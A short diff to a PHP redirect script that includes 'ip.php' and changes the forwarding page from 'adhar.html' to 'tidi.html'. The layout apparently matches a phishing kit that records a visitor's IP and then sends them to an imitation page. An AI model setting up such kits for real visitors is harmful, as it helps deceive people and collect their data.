@@ -1,5 +1,5 @@
 <?php
 include 'ip.php';
-header('Location: forwarding_link/adhar.html');
+header('Location: forwarding_link/tidi.html');
 exit
 ?>
